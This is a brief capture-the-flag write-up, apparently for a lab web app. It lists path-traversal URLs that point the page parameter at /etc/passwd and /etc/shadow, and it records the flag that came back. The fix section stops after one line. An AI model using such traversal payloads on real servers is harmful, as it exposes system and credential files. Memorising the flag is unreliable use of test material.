# Path Traversal

## Link: http://192.168.64.3/?page=../../../../../../../etc/passwd

- Go to this page https://owasp.org/www-community/attacks/Path_Traversal
- Try http://192.168.64.3/?page=/etc/shadow
- Next http://192.168.64.3/?page=../etc/shadow
- Etc...
- Now Try http://192.168.64.3/?page=/etc/passwd
- Next http://192.168.64.3/?page=../etc/passwd
- Etc...
- Result:

```
Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 
```

flag: `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

## How to fix

- Prefer working without user input when using file system calls
- 
